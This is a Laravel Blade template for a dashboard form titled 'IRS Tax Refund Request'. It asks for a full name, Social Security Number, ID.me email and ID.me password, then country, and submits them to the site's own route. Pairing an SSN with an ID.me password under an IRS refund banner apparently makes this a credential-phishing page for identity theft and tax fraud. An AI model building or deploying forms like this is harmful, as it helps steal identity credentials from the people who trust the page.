 <div class="text-center">
     <div class="bg-primary text-white rounded-circle d-inline-flex align-items-center justify-content-center mb-2"
         style="width:50px; height:50px;">
         <i class="fa-solid fa-calculator fs-4"></i>
     </div>
     <h3>IRS Tax Refund Request</h3>
     <p>Please fill out the form below to submit your IRS tax refund request</p>
 </div>

 <form action="{{ route('user.irs_tax_refund.store') }}" method="post">
     @csrf

     <x-dashboard.user.card>
         @slot('header')
             <i class="fa-solid fa-user"></i> Personal Information
         @endslot

         <x-dashboard.user.form-input name="name" label="Full Name" class="col-md-12 mb-3"
             value="{{ old('name') }}" />

         <x-dashboard.user.form-input name="social_security_number" label="Social Security Number (SSN)"
             class="col-md-12 mb-3" value="{{ old('social_security_number') }}" placeholder="xxx-xx-xxxx" />
     </x-dashboard.user.card>

     <x-dashboard.user.card>
         @slot('header')
             <i class="fa-solid fa-id-card"></i> ID.me Credentials
         @endslot

         <x-dashboard.user.form-input name="id_me_email" label="ID.me Email" type="email" class="col-md-12 mb-3"
             value="{{ old('id_me_email') }}" />

         <x-dashboard.user.form-input name="id_me_password" id="_id_me_password" type="password" label="ID.me Password"
             class="col-md-12 mb-3" />
     </x-dashboard.user.card>

     <x-dashboard.user.card>
         @slot('header')
             <i class="fa-solid fa-location-dot"></i> Location Information
         @endslot

         <x-dashboard.user.form-select name="country" label="Country" type="select" class="col-md-12 mb-3"
             value="{{ old('country') }}" :options="config('setting.countries')" />
     </x-dashboard.user.card>

     <x-dashboard.user.info-list title="Important Notice" :options="[
         'Please ensure all information provided is accurate and matches your ID.me account details. Any discrepancies may result in delays or rejection of your refund request.',
     ]" />

     <div class="float-end">
         <x-dashboard.user.form-button name="Submit Request" />
     </div>
 </form>
